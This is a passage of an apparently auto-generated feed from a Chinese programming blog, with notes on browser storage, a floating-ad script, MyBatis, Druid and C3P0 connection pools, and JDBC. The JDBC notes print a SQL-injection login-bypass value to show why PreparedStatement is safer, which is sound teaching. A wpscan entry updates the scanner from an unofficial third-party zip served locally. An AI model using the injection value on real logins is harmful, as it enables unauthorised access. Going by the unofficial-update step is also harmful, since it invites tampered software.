    <content type="html"><![CDATA[<p>1.Cookie： Cookie基于HTTP规范，用来识别用户。 Cookie是服务器发送到浏览器的一小段数据，会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。 Cookie诞生之初的作用就是解决HTTP的无状态请求，用来记录一些用户相关的一些状态。 会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息） 个性化设置（如用户自定义设置、主题等） 浏览器行为跟踪（如跟踪分析用户行为等）</p><p>2.webStorage： webStorage基于HTML5规范 HTML5 提供了两种在客户端存储数据的新方法：localStorage和sessionStorage，挂载在window对象下。 webStorage是本地存储，数据不是由服务器请求传递的。从而它可以存储大量的数据，而不影响网站的性能。 Web Storage的目的是为了克服由cookie带来的一些限制，当数据需要被严格控制在客户端上时，无须持续地将数据发回服务器。比如客户端需要保存的一些用户行为或数据，或从接口获取的一些短期内不会更新的数据，我们就可以利用Web Storage来存储</p><p>localStorage的生命周期是永久性的。localStorage存储的数据，即使关闭浏览器，也不会让数据消失，除非主动的去删除数据。如果 想设置失效时间，需自行封装。 sessionStorage 的生命周期是在浏览器关闭前。 特性： 关闭浏览器sessionStorage 失效； 页面刷新不会消除数据； 只有在当前页面打开的链接，才可以访sessionStorage的数据，使用window.open打开页面和改变localtion.href方式都可以获 取到sessionStorage内部的数据;</p>]]></content>
    
    
    <categories>
      
      <category>杂七杂八区</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>js原生代码实现漂浮广告</title>
    <link href="/2020/07/17/js%E5%8E%9F%E7%94%9F%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0%E6%BC%82%E6%B5%AE%E5%B9%BF%E5%91%8A/index/"/>
    <url>/2020/07/17/js%E5%8E%9F%E7%94%9F%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0%E6%BC%82%E6%B5%AE%E5%B9%BF%E5%91%8A/index/</url>
    
    <content type="html"><![CDATA[<pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">HTML</span> <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span> <span class="hljs-meta-string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span> New Document <span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Generator&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;EditPlus&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Author&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Keywords&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Description&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span>&gt;</span>            .delete&#123;<span class="css">                <span class="hljs-attribute">background</span>: unset;</span>            &#125;        <span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript">            <span class="hljs-built_in">window</span>.onload=<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;</span><span class="javascript">                <span class="hljs-comment">//定时器</span></span><span class="javascript">                <span class="hljs-keyword">var</span> oneInner=<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;FlyDiv&quot;</span>);</span><span class="javascript">                <span class="hljs-keyword">var</span> a1a = <span class="hljs-built_in">setInterval</span>(moves,<span class="hljs-number">500</span>);</span><span class="javascript">                <span class="hljs-comment">//函数</span></span><span class="javascript">                <span class="hljs-keyword">var</span> x = <span class="hljs-number">10</span>;</span><span class="javascript">                <span class="hljs-keyword">var</span> y = <span class="hljs-number">10</span>;</span><span class="javascript">                <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">moves</span>(<span class="hljs-params"></span>)</span>&#123;</span><span class="javascript">                    <span class="hljs-keyword">var</span> tops = oneInner.offsetTop</span><span class="javascript">                    <span class="hljs-keyword">var</span> lefts = oneInner.offsetLeft</span><span class="javascript">                    <span class="hljs-keyword">if</span> (lefts&gt;=<span class="hljs-built_in">document</span>.documentElement.clientWidth-oneInner.offsetWidth||lefts&lt;=<span class="hljs-number">0</span>)</span>                    &#123;                        x=-x                    &#125;<span class="javascript">                    <span class="hljs-keyword">if</span> (tops&gt;=<span class="hljs-built_in">document</span>.documentElement.clientHeight-oneInner.offsetHeight||tops&lt;=<span class="hljs-number">0</span>)</span>                    &#123;                        y=-y                    &#125;                    tops+=y;                    lefts+=x;<span class="javascript">                    oneInner.style.top=tops+<span class="hljs-string">&quot;px&quot;</span></span><span class="javascript">                    oneInner.style.left=lefts+<span class="hljs-string">&quot;px&quot;</span></span>                &#125;<span class="javascript">                <span class="hljs-comment">//悬停停止</span></span><span class="javascript">                oneInner.onmouseover=<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;</span><span class="javascript">                    <span class="hljs-built_in">clearInterval</span>(a1a);</span>                &#125;<span class="javascript">                <span class="hljs-comment">//放手继续运动</span></span><span class="javascript">                oneInner.onmouseout=<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;</span><span class="javascript">                    a1a =<span class="hljs-built_in">setInterval</span>(moves,<span class="hljs-number">400</span>);</span>                &#125;<span class="javascript">                <span class="hljs-comment">//删除</span></span><span class="javascript">                <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">close</span>(<span class="hljs-params"></span>)</span>&#123;</span><span class="javascript">                    <span class="hljs-built_in">document</span>.body.removeChild(oneInner);</span>                &#125;            &#125;        <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;background:#663398;position:absolute;width:200px;height:100px;border:solid 3px #2F74A7;cursor:pointer;&quot;</span>  <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;FlyDiv&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;close()&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;background: white&quot;</span>&gt;</span>    ssssssssssssssssss<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>MyBatis环境搭建</title>
    <link href="/2020/07/07/mybatis%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/index/"/>
    <url>/2020/07/07/mybatis%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/index/</url>
    
    <content type="html"><![CDATA[<p>1.创建maven工程并导入坐标</p><p>2.创建实体类和dao的借口</p><p>3.创建MyBatis的主配置文件 SqlMapConfig.xml</p><p>4.创建映射配置文件 IUserDao.xml</p><p>注意事项：</p><p>1.Mybatis中把持久层的操作接口名称和映射文件也叫做mapper，所以IUser和IUserMapper是一样的</p><p>2.idea中包创建与目录创建不一样</p><p>包：cn.qt.dao是三级结构</p><p>目录：cn.qt.dao是一级目录</p><p>3.mybatis的映射配置文件位置必须和dao接口的包结构相同</p><p>4.映射配置文件的mapper标签和namespace属性的取值必须是dao接口的全限定类名</p><p>5.映射配置文件的操作配置（select），id属性必须是dao接口的方法名</p><p>遵从了3.4.5后，开发中无需再写dao的实现类</p>]]></content>
    
    
    <categories>
      
      <category>mybatis</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>kali更新wpscan过慢</title>
    <link href="/2020/07/04/kali%E6%9B%B4%E6%96%B0wpscan%E8%BF%87%E6%85%A2/index/"/>
    <url>/2020/07/04/kali%E6%9B%B4%E6%96%B0wpscan%E8%BF%87%E6%85%A2/index/</url>
    
    <content type="html"><![CDATA[<p>1.打开终端，执行：</p><pre><code class="hljs ebnf"><span class="hljs-attribute">dpkg -L wpscan</span></code></pre><p>2.找到<em><strong>updater.rb</strong></em></p><p>3.执行：</p><pre><code class="hljs awk">leafpad <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/rubygems-integration/</span>all<span class="hljs-regexp">/gems/</span>wpscan-<span class="hljs-number">3.8</span>.<span class="hljs-number">2</span><span class="hljs-regexp">/lib/</span>wpscan<span class="hljs-regexp">/db/u</span>pdater.rb （目录自己找）</code></pre><p>4.找到大概七八十行有个链接，改成127.0.0.1</p><p>5.下载最新版本的wpscan更新包</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>blog.dsb.ink<span class="hljs-regexp">/wpscan/</span>wp.zip</code></pre><p>6.扔到apache中</p><pre><code class="hljs awk">mv wpscan <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span></code></pre><p>7.开启apache服务</p><pre><code class="hljs apache"><span class="hljs-attribute">service</span>  service apache<span class="hljs-number">2</span> start</code></pre><p>8.执行wpscan更新</p><pre><code class="hljs ada">wpscan <span class="hljs-comment">--update</span></code></pre><p>搞定</p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Druid：数据库连接池</title>
    <link href="/2020/04/19/druid%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E8%BF%9E%E6%8E%A5%E6%B1%A0/index/"/>
    <url>/2020/04/19/druid%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E8%BF%9E%E6%8E%A5%E6%B1%A0/index/</url>
    
    <content type="html"><![CDATA[<p>Druid：数据库连接池实现技术，由阿里巴巴提供的</p><ol><li><p>步骤：</p><ol><li>导入jar包 druid-1.0.9.jar</li><li>定义配置文件：<ul><li>是properties形式的        </li><li>可以叫任意名称，可以放在任意目录下</li></ul></li><li>加载配置文件。Properties</li><li>获取数据库连接池对象：通过工厂来来获取 DruidDataSourceFactory</li><li>获取连接：getConnection<ul><li>代码： //3.加载配置文件 Properties pro = new Properties(); InputStream is = DruidDemo.class.getClassLoader().getResourceAsStream(“druid.properties”); pro.load(is); //4.获取连接池对象 DataSource ds = DruidDataSourceFactory.createDataSource(pro); //5.获取连接 Connection conn = ds.getConnection();</li></ul></li></ol></li><li><p>定义工具类</p><ol><li><p>定义一个类 JDBCUtils</p></li><li><p>提供静态代码块加载配置文件，初始化连接池对象</p></li><li><p>提供方法</p><ol><li>获取连接方法：通过数据库连接池获取连接</li><li>释放资源</li><li>获取连接池的方法</li></ol><ul><li><p>代码： public class JDBCUtils {</p>  <pre><code class="hljs arduino"><span class="hljs-comment">//1.定义成员变量 DataSource</span><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> DataSource ds ;<span class="hljs-keyword">static</span>&#123;    <span class="hljs-keyword">try</span> &#123;        <span class="hljs-comment">//1.加载配置文件</span>        Properties pro = <span class="hljs-keyword">new</span> Properties();        pro.load(JDBCUtils.class.getClassLoader().getResourceAsStream(<span class="hljs-string">&quot;druid.properties&quot;</span>));        <span class="hljs-comment">//2.获取DataSource</span>        ds = DruidDataSourceFactory.createDataSource(pro);    &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;        e.printStackTrace();    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;        e.printStackTrace();    &#125;&#125;<span class="hljs-comment">/**</span><span class="hljs-comment"> * 获取连接</span><span class="hljs-comment"> */</span><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Connection <span class="hljs-title">getConnection</span><span class="hljs-params">()</span> throws SQLException </span>&#123;    <span class="hljs-keyword">return</span> ds.getConnection();&#125;<span class="hljs-comment">/**</span><span class="hljs-comment"> * 释放资源</span><span class="hljs-comment"> */</span><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">close</span><span class="hljs-params">(Statement stmt,Connection conn)</span></span>&#123;   <span class="hljs-comment">/* if(stmt != null)&#123;</span><span class="hljs-comment">        try &#123;</span><span class="hljs-comment">            stmt.close();</span><span class="hljs-comment">        &#125; catch (SQLException e) &#123;</span><span class="hljs-comment">            e.printStackTrace();</span><span class="hljs-comment">        &#125;</span><span class="hljs-comment">    &#125;</span><span class="hljs-comment"></span><span class="hljs-comment">    if(conn != null)&#123;</span><span class="hljs-comment">        try &#123;</span><span class="hljs-comment">            conn.close();//归还连接</span><span class="hljs-comment">        &#125; catch (SQLException e) &#123;</span><span class="hljs-comment">            e.printStackTrace();</span><span class="hljs-comment">        &#125;</span><span class="hljs-comment">    &#125;*/</span>   <span class="hljs-built_in">close</span>(null,stmt,conn);&#125;<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">close</span><span class="hljs-params">(ResultSet rs , Statement stmt, Connection conn)</span></span>&#123;    <span class="hljs-keyword">if</span>(rs != null)&#123;        <span class="hljs-keyword">try</span> &#123;            rs.<span class="hljs-built_in">close</span>();        &#125; <span class="hljs-keyword">catch</span> (SQLException e) &#123;            e.printStackTrace();        &#125;    &#125;    <span class="hljs-keyword">if</span>(stmt != null)&#123;        <span class="hljs-keyword">try</span> &#123;            stmt.<span class="hljs-built_in">close</span>();        &#125; <span class="hljs-keyword">catch</span> (SQLException e) &#123;            e.printStackTrace();        &#125;    &#125;    <span class="hljs-keyword">if</span>(conn != null)&#123;        <span class="hljs-keyword">try</span> &#123;            conn.<span class="hljs-built_in">close</span>();<span class="hljs-comment">//归还连接</span>        &#125; <span class="hljs-keyword">catch</span> (SQLException e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;<span class="hljs-comment">/**</span><span class="hljs-comment"> * 获取连接池方法</span><span class="hljs-comment"> */</span><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> DataSource <span class="hljs-title">getDataSource</span><span class="hljs-params">()</span></span>&#123;    <span class="hljs-keyword">return</span>  ds;&#125;</code></pre><p>  }</p></li></ul></li></ol></li></ol>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>JDBC</title>
    <link href="/2020/04/19/jdbc/index/"/>
    <url>/2020/04/19/jdbc/index/</url>
    
    <content type="html"><![CDATA[<h2 id="JDBC："><a href="#JDBC：" class="headerlink" title="JDBC："></a>JDBC：</h2><ol><li>概念：Java DataBase Connectivity Java 数据库连接， Java语言操作数据库<ul><li>JDBC本质：其实是官方（sun公司）定义的一套操作所有关系型数据库的规则，即接口。各个数据库厂商去实现这套接口，提供数据库驱动jar包。我们可以使用这套接口（JDBC）编程，真正执行的代码是驱动jar包中的实现类。</li></ul></li><li>快速入门：<ul><li>步骤：<ol><li>导入驱动jar包 mysql-connector-java-5.1.37-bin.jar<br> 1.复制mysql-connector-java-5.1.37-bin.jar到项目的libs目录下<br> 2.右键–&gt;Add As Library</li><li>注册驱动</li><li>获取数据库连接对象 Connection</li><li>定义sql</li><li>获取执行sql语句的对象 Statement</li><li>执行sql，接受返回结果</li><li>处理结果</li><li>释放资源</li></ol></li><li>代码实现：<br>  //1. 导入驱动jar包<br>  //2.注册驱动<br>  Class.forName(“com.mysql.jdbc.Driver”);<br>  //3.获取数据库连接对象<br>  Connection conn = DriverManager.getConnection(“jdbc:mysql://localhost:3306/db3”, “root”, “root”);<br>  //4.定义sql语句<br>  String sql = “update account set balance = 500 where id = 1”;<br>  //5.获取执行sql的对象 Statement<br>  Statement stmt = conn.createStatement();<br>  //6.执行sql<br>  int count = stmt.executeUpdate(sql);<br>  //7.处理结果<br>  System.out.println(count);<br>  //8.释放资源<br>  stmt.close();<br>  conn.close();</li></ul></li><li>详解各个对象：<ol><li><p>DriverManager：驱动管理对象</p><ul><li>功能：<ol><li>注册驱动：告诉程序该使用哪一个数据库驱动jar<br> static void registerDriver(Driver driver) :注册与给定的驱动程序 DriverManager 。<br> 写代码使用： Class.forName(“com.mysql.jdbc.Driver”);<br> 通过查看源码发现：在com.mysql.jdbc.Driver类中存在静态代码块<br> static {<br> try {<br> java.sql.DriverManager.registerDriver(new Driver());<br> } catch (SQLException E) {<br> throw new RuntimeException(“Can’t register driver!”);<br> }<br> } 注意：mysql5之后的驱动jar包可以省略注册驱动的步骤。</li><li>获取数据库连接：<ul><li>方法：static Connection getConnection(String url, String user, String password)</li><li>参数：<ul><li>url：指定连接的路径</li><li>语法：jdbc:mysql://ip地址(域名):端口号/数据库名称</li><li>例子：jdbc:mysql://localhost:3306/db3</li><li>细节：如果连接的是本机mysql服务器，并且mysql服务默认端口是3306，则url可以简写为：jdbc:mysql:///数据库名称</li><li>user：用户名</li><li>password：密码</li></ul></li></ul></li></ol></li></ul></li><li><p>Connection：数据库连接对象</p><ol><li>功能：<ol><li>获取执行sql 的对象<ul><li>Statement createStatement()</li><li>PreparedStatement prepareStatement(String sql)</li></ul></li><li>管理事务：<ul><li>开启事务：setAutoCommit(boolean autoCommit) ：调用该方法设置参数为false，即开启事务</li><li>提交事务：commit()</li><li>回滚事务：rollback()</li></ul></li></ol></li></ol></li><li><p>Statement：执行sql的对象</p><ol><li>执行sql<ol><li>boolean execute(String sql) ：可以执行任意的sql 了解</li><li>int executeUpdate(String sql) ：执行DML（insert、update、delete）语句、DDL(create，alter、drop)语句<ul><li>返回值：影响的行数，可以通过这个影响的行数判断DML语句是否执行成功 返回值&gt;0的则执行成功，反之，则失败。</li></ul></li><li>ResultSet executeQuery(String sql) ：执行DQL（select)语句</li></ol></li><li>练习：<ol><li><p>account表 添加一条记录</p></li><li><p>account表 修改记录</p></li><li><p>account表 删除一条记录</p><p>代码：<br>Statement stmt = null;<br>Connection conn = null;<br>try {<br>//1. 注册驱动<br>Class.forName(“com.mysql.jdbc.Driver”);<br>//2. 定义sql<br>String sql = “insert into account values(null,’王五’,3000)”;<br>//3.获取Connection对象<br>conn = DriverManager.getConnection(“jdbc:mysql:///db3”, “root”, “root”);<br>//4.获取执行sql的对象 Statement<br>stmt = conn.createStatement();<br>//5.执行sql<br>int count = stmt.executeUpdate(sql);//影响的行数<br>//6.处理结果<br>System.out.println(count);<br>if(count &gt; 0){<br>System.out.println(“添加成功！”);<br>}else{<br>System.out.println(“添加失败！”);<br>} <code>&#125; catch (ClassNotFoundException e) &#123;   e.printStackTrace();   &#125; catch (SQLException e) &#123;   e.printStackTrace();   &#125;finally &#123;   //stmt.close();   //7. 释放资源   //避免空指针异常   if(stmt != null)&#123;   try &#123;   stmt.close();   &#125; catch (SQLException e) &#123;   e.printStackTrace();   &#125;   &#125; if(conn != null)&#123; try &#123; conn.close(); &#125; catch (SQLException e) &#123; e.printStackTrace(); &#125; &#125; &#125;&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;&lt;/ol&gt;</code></p></li></ol></li><li>ResultSet：结果集对象,封装查询结果<ul><li>boolean next(): 游标向下移动一行，判断当前行是否是最后一行末尾(是否有数据)，如果是，则返回false，如果不是则返回true</li><li>getXxx(参数):获取数据<br>  * Xxx：代表数据类型 如： int getInt() , String getString()<br>  * 参数：<br>  1. int：代表列的编号,从1开始 如： getString(1)<br>  2. String：代表列名称。 如： getDouble(“balance”)</li><li>注意：<ul><li>使用步骤：<ol><li>游标向下移动一行</li><li>判断是否有数据</li><li>获取数据 //循环判断游标是否是最后一行末尾。<br> while(rs.next()){<br> //获取数据<br> //6.2 获取数据<br> int id = rs.getInt(1);<br> String name = rs.getString(“name”);<br> double balance = rs.getDouble(3); <code>System.out.println(id + &quot;---&quot; + name + &quot;---&quot; + balance);</code> }</li></ol></li></ul></li><li>练习：<ul><li>定义一个方法，查询emp表的数据将其封装为对象，然后装载集合，返回。<ol><li>定义Emp类</li><li>定义方法 public List findAll(){}</li><li>实现方法 select * from emp;</li></ol></li></ul></li></ul></li><li>PreparedStatement：执行sql的对象<ol><li>SQL注入问题：在拼接sql时，有一些sql的特殊关键字参与字符串的拼接。会造成安全性问题<ol><li>输入用户随便，输入密码：a’ or ‘a’ = ‘a</li><li>sql：select * from user where username = ‘fhdsjkf’ and password = ‘a’ or ‘a’ = ‘a’</li></ol></li><li>解决sql注入问题：使用PreparedStatement对象来解决</li><li>预编译的SQL：参数使用?作为占位符</li><li>步骤：<ol><li>导入驱动jar包 mysql-connector-java-5.1.37-bin.jar</li><li>注册驱动</li><li>获取数据库连接对象 Connection</li><li>定义sql<ul><li>注意：sql的参数使用？作为占位符。 如：select * from user where username = ? and password = ?;</li></ul></li><li>获取执行sql语句的对象 PreparedStatement Connection.prepareStatement(String sql)</li><li>给？赋值：<ul><li>方法： setXxx(参数1,参数2)<ul><li>参数1：？的位置编号 从1 开始</li><li>参数2：？的值</li></ul></li></ul></li><li>执行sql，接受返回结果，不需要传递sql语句</li><li>处理结果</li><li>释放资源</li></ol></li><li>注意：后期都会使用PreparedStatement来完成增删改查的所有操作<ol><li>可以防止SQL注入</li><li>效率更高</li></ol></li></ol></li></ol><p>`抽取JDBC工具类 ： JDBCUtils 目的：简化书写 分析： 注册驱动也抽取 抽取一个方法获取连接对象 需求：不想传递参数（麻烦），还得保证工具类的通用性。 解决：配置文件<br>jdbc.properties<br>url=<br>user=<br>password= 抽取一个方法释放资源 代码实现：<br>public class JDBCUtils {<br>private static String url;<br>private static String user;<br>private static String password;<br>private static String driver;<br>/**  </p></li></ol><ul><li>文件的读取，只需要读取一次即可拿到这些值。使用静态代码块  </li><li>/<br>static{<br>//读取资源文件，获取值。 try { //1. 创建Properties集合类。 Properties pro = new Properties(); //获取src路径下的文件的方式—&gt;ClassLoader 类加载器 ClassLoader classLoader = JDBCUtils.class.getClassLoader(); URL res = classLoader.getResource(“jdbc.properties”); String path = res.getPath(); System.out.println(path);///D:/IdeaProjects/itcast/out/production/day04_jdbc/jdbc.properties //2. 加载文件 // pro.load(new FileReader(“D:\IdeaProjects\itcast\day04_jdbc\src\jdbc.properties”)); pro.load(new FileReader(path)); //3. 获取数据，赋值 url = pro.getProperty(“url”); user = pro.getProperty(“user”); password = pro.getProperty(“password”); driver = pro.getProperty(“driver”); //4. 注册驱动 Class.forName(driver); } catch (IOException e) { e.printStackTrace(); } catch (ClassNotFoundException e) { e.printStackTrace(); }} /** * 获取连接 * @return 连接对象 */ public static Connection getConnection() throws SQLException {return DriverManager.getConnection(url, user, password);} /** * 释放资源 * @param stmt * @param conn */ public static void close(Statement stmt,Connection conn){ if( stmt != null){ try { stmt.close(); } catch (SQLException e) { e.printStackTrace(); } }if( conn != null){ try { conn.close(); } catch (SQLException e) { e.printStackTrace(); } }} /** * 释放资源 * @param stmt * @param conn */ public static void close(ResultSet rs,Statement stmt, Connection conn){ if( rs != null){ try { rs.close(); } catch (SQLException e) { e.printStackTrace(); } }if( stmt != null){ try { stmt.close(); } catch (SQLException e) { e.printStackTrace(); } } if( conn != null){ try { conn.close(); } catch (SQLException e) { e.printStackTrace(); } }} } JDBC控制事务： 事务：一个包含多个步骤的业务操作。如果这个业务操作被事务管理，则这多个步骤要么同时成功，要么同时失败。 操作： 开启事务 提交事务 回滚事务 使用Connection对象来管理事务 开启事务：setAutoCommit(boolean autoCommit) ：调用该方法设置参数为false，即开启事务 在执行sql之前开启事务 提交事务：commit() 当所有sql都执行完提交事务 回滚事务：rollback() 在catch中回滚事务 代码：<br>public class JDBCDemo10 { public static void main(String[] args) { Connection conn = null; PreparedStatement pstmt1 = null; PreparedStatement pstmt2 = null; try { //1.获取连接 conn = JDBCUtils.getConnection(); //开启事务 conn.setAutoCommit(false); //2.定义sql //2.1 张三 - 500 String sql1 = “update account set balance = balance - ? where id = ?”; //2.2 李四 + 500 String sql2 = “update account set balance = balance + ? where id = ?”; //3.获取执行sql对象 pstmt1 = conn.prepareStatement(sql1); pstmt2 = conn.prepareStatement(sql2); //4. 设置参数 pstmt1.setDouble(1,500); pstmt1.setInt(2,1); pstmt2.setDouble(1,500); pstmt2.setInt(2,2); //5.执行sql pstmt1.executeUpdate(); // 手动制造异常 int i = 3/0; pstmt2.executeUpdate(); //提交事务 conn.commit(); } catch (Exception e) { //事务回滚 try { if(conn != null) { conn.rollback(); } } catch (SQLException e1) { e1.printStackTrace(); } e.printStackTrace(); }finally { JDBCUtils.close(pstmt1,conn); JDBCUtils.close(pstmt2,null); } }}`</li></ul></li></ol>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>数据库连接池C3P0</title>
    <link href="/2020/04/19/%E6%95%B0%E6%8D%AE%E5%BA%93%E8%BF%9E%E6%8E%A5%E6%B1%A0c3p0-2/index/"/>
    <url>/2020/04/19/%E6%95%B0%E6%8D%AE%E5%BA%93%E8%BF%9E%E6%8E%A5%E6%B1%A0c3p0-2/index/</url>
    
    <content type="html"><![CDATA[<h2 id="数据库连接池："><a href="#数据库连接池：" class="headerlink" title="数据库连接池："></a>数据库连接池：</h2><p>1.概念：一个容器（集合），用来存放数据库连接 <em>当系统初始化完成后，容器被创建，容器会申请一些数据库连接对象，当用户来访问数据库时，从容器获取数据库连接对象，使用完成后归还连接 2.好处： 1.节约资源 2.用户访问高效 3.实现： 1.标准接口：DataSource javax.sql下 1.方法：</em> 获取连接：getConnection（） <em>归还连接：Connection.close（） 如果连接对象是从数据库连接池中获取的，那么调用Connection.close（）方法不会释放连接而是归还给连接池 2.一般会有厂商实现： 1.C3P0：数据库连接技术 2.Druid：数据库连接池实现技术 ，阿里巴巴提供的 4.C3P0：数据库连接技术</em> 步骤： 1.导入jar包：c3p0-0.9.5.2.jar ，mchange-commons-java-0.2.12.jar（依赖jar包） 2.定义配置文件： <em>名称：c3p0-config.xml或者c3p0.properties</em> 路径：直接将文件放在src目录下即可 3.创建核心对象：数据库连接池对象 ComboPooledDataSource 4.获取连接： <code>//1.创建数据库连接池对象 DataSource ds=new ComboPooledDataSource(); try &#123; //2.获取连接对象,传参的话可使用其他配置，不传则走默认配置 Connection conn=ds.getConnection(); System.out.println(conn); &#125; catch (SQLException e) &#123; e.printStackTrace(); &#125;</code></p>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>JDBC</title>
    <link href="/2020/04/19/%E6%95%B0%E6%8D%AE%E5%BA%93%E8%BF%9E%E6%8E%A5%E6%B1%A0c3p0/index/"/>
    <url>/2020/04/19/%E6%95%B0%E6%8D%AE%E5%BA%93%E8%BF%9E%E6%8E%A5%E6%B1%A0c3p0/index/</url>
    
    <content type="html"><![CDATA[<h2 id="JDBC："><a href="#JDBC：" class="headerlink" title="JDBC："></a>JDBC：</h2><ol><li>概念：Java DataBase Connectivity Java 数据库连接， Java语言操作数据库<ul><li>JDBC本质：其实是官方（sun公司）定义的一套操作所有关系型数据库的规则，即接口。各个数据库厂商去实现这套接口，提供数据库驱动jar包。我们可以使用这套接口（JDBC）编程，真正执行的代码是驱动jar包中的实现类。</li></ul></li><li>快速入门：<ul><li>步骤：<ol><li>导入驱动jar包 mysql-connector-java-5.1.37-bin.jar 1.复制mysql-connector-java-5.1.37-bin.jar到项目的libs目录下 2.右键–&gt;Add As Library</li><li>注册驱动</li><li>获取数据库连接对象 Connection</li><li>定义sql</li><li>获取执行sql语句的对象 Statement</li><li>执行sql，接受返回结果</li><li>处理结果</li><li>释放资源</li></ol></li><li>代码实现： //1. 导入驱动jar包 //2.注册驱动 Class.forName(“com.mysql.jdbc.Driver”); //3.获取数据库连接对象 Connection conn = DriverManager.getConnection(“jdbc:mysql://localhost:3306/db3”, “root”, “root”); //4.定义sql语句 String sql = “update account set balance = 500 where id = 1”; //5.获取执行sql的对象 Statement Statement stmt = conn.createStatement(); //6.执行sql int count = stmt.executeUpdate(sql); //7.处理结果 System.out.println(count); //8.释放资源 stmt.close(); conn.close();</li></ul></li><li>详解各个对象：<ol><li>DriverManager：驱动管理对象<ul><li>功能：<ol><li>注册驱动：告诉程序该使用哪一个数据库驱动jar static void registerDriver(Driver driver) :注册与给定的驱动程序 DriverManager 。 写代码使用： Class.forName(“com.mysql.jdbc.Driver”); 通过查看源码发现：在com.mysql.jdbc.Driver类中存在静态代码块 static { try { java.sql.DriverManager.registerDriver(new Driver()); } catch (SQLException E) { throw new RuntimeException(“Can’t register driver!”); } } 注意：mysql5之后的驱动jar包可以省略注册驱动的步骤。</li><li>获取数据库连接：<ul><li>方法：static Connection getConnection(String url, String user, String 